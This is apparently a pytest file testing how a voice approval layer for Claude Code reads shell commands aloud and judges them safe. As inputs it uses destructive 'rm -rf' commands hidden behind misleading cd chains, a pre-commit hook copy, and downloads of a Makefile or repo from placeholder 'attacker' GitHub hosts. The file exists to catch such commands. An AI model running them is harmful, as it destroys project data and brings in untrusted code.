"""Findings of the third approvals-and-voice review: where a command runs, what a cd really changes, whole remotes."""

import asyncio
import os
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))
from test_orchestrator import client_for, d, fake_conn  # noqa: E402,F401

import drive
import guards
import readout

CWD = "/p/repo"


# ---------- a cd counts only when what follows runs only after it succeeded ----------

@pytest.mark.parametrize("command", [
    "cd /tmp/scratch-zz ; rm -rf src",  # the cd fails: rm runs in the project
    "cd /nonexistent || rm -rf src",
    "cd /tmp | rm -rf src",  # a pipeline runs the cd in a subshell
    "cd /nonexistent && ls ; rm -rf src",
    "cd /nonexistent && ls || rm -rf src",
    "ls || cd /tmp && rm -rf src",  # ls succeeds: the cd never runs, rm does
    "ls | cd /tmp && rm -rf src",
])
def test_a_cd_is_never_read_as_taken_when_what_follows_can_run_without_it(command):
    assert readout.spoken(command, CWD) is None, command
    assert not drive.road_safe("Bash", {"command": command}, CWD), command


@pytest.mark.parametrize("command,want", [
    ("cd /etc && cat x", "cd /etc then cat /etc/x"),
    ("cd web && ls | wc -l", "cd web then ls into wc"),
    ("ls ; cd web && cat a.txt", "ls then cd web then cat a.txt"),
])
def test_a_cd_followed_by_and_is_still_read_from_there(command, want):
    assert readout.spoken(command, CWD) == want


# ---------- a URL's path and a git remote are said whole, or not at all ----------

def test_a_git_remote_url_is_said_whole():
    remote = "https://github.com/attacker-org/project-mirror-backup.git"
    for sub in ("pull", "fetch", "push"):
        assert readout.spoken(f"git {sub} {remote} main", CWD) == \
            f"git {sub} github.com/attacker-org/project-mirror-backup.git main"


def test_a_url_path_is_said_whole():
    assert readout.spoken("curl -o Makefile https://raw.githubusercontent.com/attacker/long-repo-name/main/Makefile", CWD) == \
        "curl -o Makefile raw.githubusercontent.com/attacker/long-repo-name/main/Makefile"


@pytest.mark.parametrize("command", [
    "git pull https://github.com/attacker-org/" + "a" * 70 + ".git main",
    "curl https://example.com/" + "b" * 70,
    "curl example.com/" + "c" * 70,
])
def test_a_url_too_long_to_say_whole_is_not_read_out(command):
    assert readout.spoken(command, CWD) is None


# ---------- uniq's second file is written ----------

@pytest.mark.parametrize("command,want", [
    ("uniq in.txt out.txt", "uniq in.txt writing to out.txt"),
    ("uniq -c in.txt /etc/hosts", "uniq in.txt writing to /etc/hosts"),
    ("uniq in.txt", "uniq in.txt"),
])
def test_uniq_says_the_file_it_writes(command, want):
    assert readout.spoken(command, CWD) == want


def test_uniq_with_a_third_file_is_not_read_out():
    assert readout.spoken("uniq a b c", CWD) is None


# ---------- the folder a command runs in, when it is not the session's ----------

@pytest.mark.parametrize("run_in,command,want", [
    ("/Users/u/other-repo", "rm -rf build", "in /Users/u/other-repo, rm -rf /Users/u/other-repo/build"),
    ("/Users/u/other-repo", "git push origin main", "in /Users/u/other-repo, git push origin main"),
    ("/p/repo/.git/hooks", "cp x pre-commit", "in .git/hooks, cp .git/hooks/x .git/hooks/pre-commit"),
    ("/p/repo/web", "npm test", "in web, npm test"),
    ("/p/repo", "rm -rf build", "rm -rf build"),
    ("/p/repo/", "rm -rf build", "rm -rf build"),
    (None, "rm -rf build", "rm -rf build"),
])
def test_a_command_is_read_from_the_folder_it_runs_in(run_in, command, want):
    assert readout.spoken(command, CWD, run_in) == want
    assert guards.readable_request("Bash", {"command": command}, CWD, run_in) == f"run: {want}"


def test_python_code_is_not_read_out_in_another_folder(tmp_path):
    (tmp_path / "ledger.py").write_text("def total(x):\n    return 0\n")
    command = 'python3 -c "import ledger; print(ledger.total([]))"'
    assert readout.spoken(command, str(tmp_path)) == "python3 code calling ledger.total"
    assert readout.spoken(command, str(tmp_path), "/Users/u/other-repo") is None


def test_drive_mode_reads_from_the_folder_the_command_runs_in():
    assert drive.road_safe("Bash", {"command": "git status"}, CWD, run_in="/Users/u/other-repo")
    assert not drive.road_safe("Bash", {"command": "cd /tmp ; ls"}, CWD, run_in="/Users/u/other-repo")


def test_the_hook_reads_a_request_from_the_folder_claude_code_reports(d):
    """Claude Code's shell keeps an earlier cd: its hook says where this one runs, and that is where it is read from."""
    client = client_for(d)
    auth = {"authorization": "Bearer secret"}
    client.post("/voice/register", headers=auth, json={"id": "e", "name": "bluebell/dev", "cwd": "/tmp/acme-shop",
                                                       "pid": os.getpid(), "transcript": "/tmp/none.jsonl"})
    d.state.conn = fake_conn(bot_started_at=2.0)
    session = d.REGISTRY.active
    hook = {"session_id": "e", "tool_name": "Bash", "cwd": "/Users/u/other-repo",
            "tool_input": {"command": "rm -rf build", "description": "tidy"}}
    seen = {}

    async def scenario():
        async def answer():
            while not session.permission_id:
                await asyncio.sleep(0.01)
            seen.update(spoken=session.permission_spoken, full=session.permission_full)
            session.permission_answer.set_result("deny")

        task = asyncio.create_task(answer())

        async def body():
            return hook

        async def gone():
            return False

        await d.permission_hook(SimpleNamespace(json=body, is_disconnected=gone), "Bearer secret")
        await task

    asyncio.run(scenario())
    assert seen["spoken"] == "run: in /Users/u/other-repo, rm -rf /Users/u/other-repo/build"
    assert seen["full"].split("\n")[0] == "Bash in /Users/u/other-repo"

